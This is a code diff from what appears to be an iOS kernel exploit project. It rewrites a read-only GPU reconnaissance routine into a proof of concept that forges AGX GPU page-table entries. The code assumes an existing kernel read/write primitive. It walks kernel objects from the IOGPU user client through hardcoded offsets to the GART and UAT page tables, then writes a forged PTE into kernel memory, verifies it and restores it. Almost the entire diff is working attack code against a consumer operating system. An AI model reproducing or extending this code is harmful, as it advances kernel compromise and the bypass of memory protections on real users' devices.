@@ -5317,180 +5317,73 @@ static void kpDumpPtrFields(NSMutableString *r, uint64_t objVA, const char *name
     NSMutableString *r = [NSMutableString string];
     [[NSFileManager defaultManager] removeItemAtPath:[NSHomeDirectory() stringByAppendingPathComponent:@"Documents/kexproof-gart.txt"] error:nil];
     gGartLive = YES;
-    GNOTE( @"=== GART recon (IOGPU → AGXSecureGart, read-only) ===");
+    GNOTE( @"=== GART forge PoC (хирургический, ~15 чтений) ===");
     if (!gPrimitives.kreadbuf || !gPrimitives.kwritebuf) {
         [r appendString:@"KRW не жив — сначала эксплойт.\n"];
+        gGartLive = NO;
         return r;
     }
     extern uint64_t kp_rc_kread64(uint64_t);
-    extern uint64_t task_get_ipc_port_kobject(uint64_t, mach_port_t);
-    extern uint64_t kvtophys(uint64_t);
-    extern uint64_t proc_self(void);
+    extern void kp_rc_kwrite64(uint64_t, uint64_t);
 
-    // 1. open IOGPU user client — тип подбираем перебором
+    // 1. IOGPU user client (type 1 — единственный рабочий на 18.6)
     io_service_t svc = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching("IOGPU"));
-    if (!svc) svc = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching("AGXAccelerator"));
-    GNOTE( [NSString stringWithFormat:@"  сервис IOGPU: %#x", svc]);
-    if (!svc) { [r appendString:@"FAIL: сервис не найден\n"]; return r; }
+    if (!svc) { GNOTE( @"FAIL: сервис IOGPU"); gGartLive = NO; return r; }
     io_connect_t conn = 0;
-    kern_return_t kr = 0;
-    for (uint32_t t = 0; t <= 7; t++) {
-        kern_return_t k2 = IOServiceOpen(svc, mach_task_self(), t, &conn);
-        GNOTE( [NSString stringWithFormat:@"  IOServiceOpen type=%u: kr=%#x conn=%#x", t, k2, conn]);
-        if (k2 == KERN_SUCCESS && conn) { kr = 0; break; }
-        kr = k2;
-    }
+    kern_return_t kr = IOServiceOpen(svc, mach_task_self(), 1, &conn);
     IOObjectRelease(svc);
-    if (kr || !conn) { [r appendString:@"FAIL: ни один тип не открылся\n"]; return r; }
+    GNOTE( [NSString stringWithFormat:@"  open(1): kr=%#x conn=%#x", kr, conn]);
+    if (kr || !conn) { gGartLive = NO; return r; }
 
-    // 2. port → kobject (IOGPUDeviceUserClient): резолвер generic — для любого
-    // mach-порта (ie_object → ipc_port → ip_kobject). Сначала прогреваем таблицу.
-    if (![self rcIsTableWithLog:r]) { [r appendString:@"FAIL: is_table\n"]; return r; }
-    uint64_t uc = kp_untag_ptr([self rcResolveThreadKVA:conn]);
-    GNOTE( [NSString stringWithFormat:@"  userclient @ %#llx", uc]);
-    if (!kpLooksLikeKernelPointer(uc)) { [r appendString:@"FAIL: uc resolve\n"]; return r; }
-
-    // 3. цепочка: conn → IOMachPort → +0x30 (pacda) → AGXDeviceUserClient
-    //    → +0xf8 → AGXAcceleratorG16P → +0x208 → IOGPUDevice
+    // 2. цепочка: conn → IOMachPort+0x30 → AGXUC+0xf8 → accel+0xd0 → gart
+    if (![self rcIsTableWithLog:r]) { [r appendString:@"FAIL: is_table\n"]; gGartLive = NO; return r; }
     uint64_t mp = kp_untag_ptr([self rcResolveThreadKVA:conn]);
-    GNOTE( [NSString stringWithFormat:@"  IOMachPort @ %#llx", mp]);
-    if (!kpLooksLikeKernelPointer(mp)) { [r appendString:@"FAIL: machport resolve\n"]; return r; }
-    uint64_t rawUC = kp_rc_kread64(mp + 0x30);
-    uint64_t agxuc = kp_untag_ptr(rawUC);
-    GNOTE( [NSString stringWithFormat:@"  +0x30 raw=%#llx → AGXUC @ %#llx", rawUC, agxuc]);
-    if (!kpLooksLikeKernelPointer(agxuc)) { [r appendString:@"FAIL: uc\n"]; return r; }
+    uint64_t agxuc = kp_untag_ptr(kp_rc_kread64(mp + 0x30));
     uint64_t accel = kp_untag_ptr(kp_rc_kread64(agxuc + 0xf8));
-    uint64_t iogpuDev = kp_untag_ptr(kp_rc_kread64(accel + 0x208));
-    GNOTE( [NSString stringWithFormat:@"  accel(AGXAcceleratorG16P)=%#llx IOGPUDevice=%#llx", accel, iogpuDev]);
-
-    // 4. самодокументирующийся дамп: uc / accel (gart там) / device
-    kpDumpPtrFields(r, agxuc, "AGXDeviceUserClient", 0x138);
-    if (kpLooksLikeKernelPointer(accel)) kpDumpPtrFields(r, accel, "AGXAcceleratorG16P", 0x8c00);
-    if (kpLooksLikeKernelPointer(iogpuDev)) kpDumpPtrFields(r, iogpuDev, "IOGPUDevice", 0x100);
-
-    // 5. gart: accel+0xd0 → AGXGartG16 (IOGPU::start: blraa slot197 → str [x19,#0xd0]).
-    //    Сверка vtable: slid 0xfffffff007b62560 (AGXGartG16).
     uint64_t gart = kp_untag_ptr(kp_rc_kread64(accel + 0xd0));
-    GNOTE( [NSString stringWithFormat:@"  accel+0xd0 → gart @ %#llx", gart]);
-    // таблицы уже существуют в системе (GPU активен у ОС) — Metal НЕ нужен,
-    // его churn детонирует heap, искалеченный эксплойтом (3 ресета доказали).
-    // Идём по VA известной ЖИВОЙ записи: 0x10000000000 (pc=16, pd=0, pt=0).
-    gBufGPUVA = 0x10000000000ULL;
-    if (kpLooksLikeKernelPointer(gart)) {
-        uint64_t gvt = kp_untag_ptr(kp_rc_kread64(gart));
-        uint64_t kbase = kconstant(base);
-        uint64_t slide = kbase - 0xfffffff007004000;
-        uint64_t expect = 0xfffffff007b62560 + slide;
-        GNOTE( [NSString stringWithFormat:@"  gart vtable=%#llx (ждём AGXGartG16=%#llx → %@)",
-                   gvt, expect, gvt == expect ? @"СОВПАЛО" : @"другой класс"]);
-        // роли ttbr: 4×int32 при +0x1d8..+0x1e4 (читаем ПОСЛЕ Metal-буфера)
-        uint32_t roles[4] = {0};
-        kreadbuf(gart + 0x1d8, roles, 16);
-        GNOTE( [NSString stringWithFormat:@"  roles: %+d %+d %+d %+d", (int)roles[0], (int)roles[1], (int)roles[2], (int)roles[3]]);
-        // наш pmap → ttep → pa0 буфера (один раз на отчёт, для PTE-матчей)
-        uint64_t ttep = 0, pa0 = 0;
-        {
-            mach_port_t tp = mach_thread_self();
-            uint64_t tva = [self rcResolveThreadKVA:tp];
-            mach_port_deallocate(mach_task_self(), tp);
-            uint64_t tro = kp_untag_ptr(kp_rc_kread64(tva + 0x3E8));
-            uint64_t selfProc = kp_untag_ptr(kp_rc_kread64(tro + off_thread_ro_tro_proc));
-            uint64_t p_ro = kp_untag_ptr(kp_rc_kread64(selfProc + off_proc_p_proc_ro));
-            uint64_t selfTask = kp_untag_ptr(kp_rc_kread64(p_ro + off_proc_ro_pr_task));
-            uint64_t map = kp_untag_ptr(kp_rc_kread64(selfTask + off_task_map));
-            uint64_t pmap = kp_untag_ptr(kp_rc_kread64(map + koffsetof(vm_map, pmap)));
-            ttep = kp_untag_ptr(kp_rc_kread64(pmap + koffsetof(pmap, ttep)));
-            extern uint64_t vtophys(uint64_t, uint64_t);
-            if (ttep && gBufContents) pa0 = vtophys(ttep, (uint64_t)gBufContents);
-            GNOTE( [NSString stringWithFormat:@"  ttep=%#llx buf contents=%p pa0=%#llx", ttep, gBufContents, pa0]);
-        }
-        // все слоты fGartTables, которые должны существовать: {1,7,8,9,10,11,12}
-        const int wantIdx[] = {1, 7, 8, 9, 10, 11, 12};
-        for (int i = 0; i < 7; i++) {
-            int ix = wantIdx[i];
-            uint64_t backing = kp_untag_ptr(kp_rc_kread64(gart + 0x1e8 + (uint64_t)ix * 8));
-            GNOTE( [NSString stringWithFormat:@"  fGartTables[%d] = %#llx", ix, backing]);
-            // phys-гейт на ВСЕ чтения по вычисленным указателям (LLC bus error)
-            BOOL backOK = kpLooksLikeKernelPointer(backing) && kvtophys(backing) && kpPAIsManaged(kvtophys(backing));
-            if (backOK) {
-                for (uint32_t o = 0; o < 0x88; o += 8)
-                    GNOTE( [NSString stringWithFormat:@"    backing+%#04x = %#llx", o, kp_rc_kread64(backing + o)]);
-                if (pa0) {
-                    // скан массивов backing: ищем PTE с нашим PA (несколько
-                    // кодировок: raw и phys>>2 — формат AGX PTE не документирован)
-                    for (uint32_t o = 0x28; o <= 0x48; o += 8) {
-                        uint64_t arr = kp_untag_ptr(kp_rc_kread64(backing + o));
-                        uint64_t arrpa = kpLooksLikeKernelPointer(arr) ? kvtophys(arr) : 0;
-                        if (!arrpa || !kpPAIsManaged(arrpa)) continue;
-                        NSMutableString *line = [NSMutableString stringWithFormat:@"    arr[+%#x] @ %#llx:", o, arr];
-                        for (int j = 0; j < 8; j++) {
-                            uint64_t e = kp_rc_kread64(arr + (uint64_t)j * 8);
-                            BOOL hitRaw = ((e & 0xFFFFFFFFC000ULL) == (pa0 & 0xFFFFFFFFC000ULL)) && (e & ~0x3fffULL);
-                            BOOL hitSh2 = (((e << 2) & 0xFFFFFFFFC000ULL) == (pa0 & 0xFFFFFFFFC000ULL)) && e && !(e >> 62);
-                            [line appendFormat:@" %#llx%@", e, hitRaw ? @"←PTE!" : (hitSh2 ? @"←PTE(>>2)!" : @"")];
-                        }
-                        GNOTE( line);
-                    }
-                }
-            }
-        }
+    uint64_t mux = kp_untag_ptr(kp_rc_kread64(gart + 0x288));
+    uint64_t uat = kp_untag_ptr(kp_rc_kread64(mux + 0x10));
+    uint64_t mapper = kp_untag_ptr(kp_rc_kread64(uat + 0x20));
+    uint64_t L1arr = kp_untag_ptr(kp_rc_kread64(mapper + 0x30));
+    GNOTE( [NSString stringWithFormat:@"  цепь: uc=%#llx accel=%#llx gart=%#llx uat=%#llx mapper=%#llx L1arr=%#llx",
+               agxuc, accel, gart, uat, mapper, L1arr]);
 
-        // 6. IOUAT: mux+0x10 = IOUnifiedAddressTranslator (наш девайс на нём).
-        //    Дампим его поля и гуляем по указателям, ища наш PA (маска 42 бита).
-        uint64_t kbase2 = kconstant(base);
-        uint64_t slide2 = kbase2 - 0xfffffff007004000;
-        uint64_t gpuVA = gBufGPUVA;
-        uint64_t mux = kp_untag_ptr(kp_rc_kread64(gart + 0x288));
-        uint64_t uat = kp_untag_ptr(kp_rc_kread64(mux + 0x10));
-        uint64_t uvt = kpLooksLikeKernelPointer(uat) ? kp_untag_ptr(kp_rc_kread64(uat)) : 0;
-        uint64_t expectU = 0xfffffff007b34568 + slide2;
-        GNOTE( [NSString stringWithFormat:@"  IOUAT @ %#llx vtable=%#llx (ждём %#llx → %@)",
-                   uat, uvt, expectU, uvt == expectU ? @"СОВПАЛО" : @"другой класс"]);
-        GNOTE( [NSString stringWithFormat:@"  gart+0x278=%#llx gart+0x280=%#llx gpuVA=%#llx",
-                   kp_rc_kread64(gart + 0x278), kp_rc_kread64(gart + 0x280), gpuVA]);
-        if (kpLooksLikeKernelPointer(uat)) {
-            // canary глобалов + глобальный mapper (user-side может быть там)
-            uint64_t canary = kp_rc_kread64(kbase2 + (0xaa2c418 - 0xfffffff007004000));
-            uint64_t gMapper = kp_untag_ptr(kp_rc_kread64(kbase2 + (0xaad63c0 - 0xfffffff007004000)));
-            GNOTE( [NSString stringWithFormat:@"  canary[0xaa2c418]=%#llx (ждём 0x7FF000000000) · globalMapper=%#llx", canary, gMapper]);
-            // mapper 1: IOUAT+0x20
-            uint64_t mapper1 = kp_untag_ptr(kp_rc_kread64(uat + 0x20));
-            uint64_t L3kv = kpUatWalkScan(r, mapper1, gpuVA, pa0, "iouat+20");
-            // mapper 2: global
-            kpUatWalkScan(r, gMapper, gpuVA, pa0, "global");
+    // 3. walk по известной ЖИВОЙ VA 0x10000000000 (pc=16, pd=0, pt=0 — там
+    //    живые записи от системной GPU-активности; доказано recon'ом)
+    uint64_t gpuVA = 0x10000000000ULL;
+    uint64_t e1 = kp_rc_kread64(L1arr + 16 * 8);
+    uint64_t L2 = (e1 & 1) ? gPrimitives.phystokv(e1 & 0xFFFFFFFFF000ULL) : 0;
+    uint64_t e2 = L2 ? kp_rc_kread64(L2 + 0) : 0;
+    uint64_t L3 = (e2 & 1) ? gPrimitives.phystokv(e2 & 0xFFFFFFFFF000ULL) : 0;
+    GNOTE( [NSString stringWithFormat:@"  walk: e1=%#llx L2=%#llx e2=%#llx L3=%#llx", e1, L2, e2, L3]);
+    if (!L3) { GNOTE( @"FAIL: таблица не достигнута"); gGartLive = NO; return r; }
 
-            // 8. PTE forge probe (benign): тип фрейма L3 + запись в пустой слот
-            //    ЗНАЧЕНИЕМ ЖИВОЙ ЗАПИСИ [0] (страница уже GPU-мапнута) + readback.
-            if (L3kv) {
-                uint64_t tableVA = [self frameTableVAWithLog:r];
-                int ft = kpVAType(L3kv, tableVA);
-                GNOTE( [NSString stringWithFormat:@"  frame type L3 страницы = 0x%x (0x21=heap RW — пишется)", ft]);
-                int emptySlot = -1;
-                for (int j = 200; j < 2048; j++) if (kp_rc_kread64(L3kv + (uint64_t)j * 8) == 0) { emptySlot = j; break; }
-                GNOTE( [NSString stringWithFormat:@"  пустой слот: %d", emptySlot]);
-                if (emptySlot >= 0) {
-                    uint64_t live = kp_rc_kread64(L3kv); // живой эталон (valid PTE)
-                    uint64_t forge = live; // дублируем существующий маппинг — безопасно
-                    uint64_t slotVA = L3kv + (uint64_t)emptySlot * 8;
-                    extern void kp_rc_kwrite64(uint64_t, uint64_t);
-                    kp_rc_kwrite64(slotVA, forge);
-                    uint64_t rb = kp_rc_kread64(slotVA);
-                    GNOTE( [NSString stringWithFormat:@"  PTE forge: wrote=%#llx read=%#llx → %@",
-                               forge, rb, rb == forge ? @"ЗАПИСЬ ПРИЛИПЛА" : @"не прилипла"]);
-                    kp_rc_kwrite64(slotVA, 0);
-                    GNOTE( [NSString stringWithFormat:@"  restore: %#llx", kp_rc_kread64(slotVA)]);
-                }
-            }
-            // сырой дамп IOUAT (ненулевые) — для офлайн-разбора
-            NSMutableString *ud = [NSMutableString stringWithString:@"  IOUAT nonzero:"];
-            int nu = 0;
-            for (uint32_t o = 0; o < 0x578 && nu < 48; o += 8) {
-                uint64_t e = kp_rc_kread64(uat + o);
-                if (e) { [ud appendFormat:@" +%#x=%#llx", o, e]; nu++; }
-            }
-            GNOTE( ud);
-        }
+    // 4. живой эталон PTE + тип фрейма L3-страницы
+    uint64_t live = 0;
+    int liveIdx = -1;
+    for (int j = 0; j < 2048; j++) {
+        uint64_t e = kp_rc_kread64(L3 + (uint64_t)j * 8);
+        if (e) { live = e; liveIdx = j; break; }
     }
+    uint64_t tableVA = [self frameTableVAWithLog:r];
+    int ft = kpVAType(L3, tableVA);
+    GNOTE( [NSString stringWithFormat:@"  L3 живой эталон [%d]=%#llx · frame type L3 = 0x%x %@", liveIdx, live, ft,
+               ft == 0x21 ? @"(heap RW — пишется)" : @"(НЕ heap — писать опасно!)"]);
+
+    // 5. форж: дублируем живую запись в пустой слот (той же таблицы), readback, restore
+    if (live && ft == 0x21) {
+        int emptySlot = -1;
+        for (int j = 200; j < 2048; j++) if (kp_rc_kread64(L3 + (uint64_t)j * 8) == 0) { emptySlot = j; break; }
+        if (emptySlot >= 0) {
+            uint64_t slotVA = L3 + (uint64_t)emptySlot * 8;
+            kp_rc_kwrite64(slotVA, live);
+            uint64_t rb = kp_rc_kread64(slotVA);
+            GNOTE( [NSString stringWithFormat:@"  PTE forge: slot=%d wrote=%#llx read=%#llx → %@",
+                       emptySlot, live, rb, rb == live ? @"ЗАПИСЬ ПРИЛИПЛА — GPU page tables пишутся с AP!" : @"не прилипла"]);
+            kp_rc_kwrite64(slotVA, 0);
+            GNOTE( [NSString stringWithFormat:@"  restore: %#llx", kp_rc_kread64(slotVA)]);
+        } else GNOTE( @"  пустого слота нет");
+    } else GNOTE( @"  skip forge: нет живого эталона или тип не RW");
     gGartLive = NO;
     return r;
 }
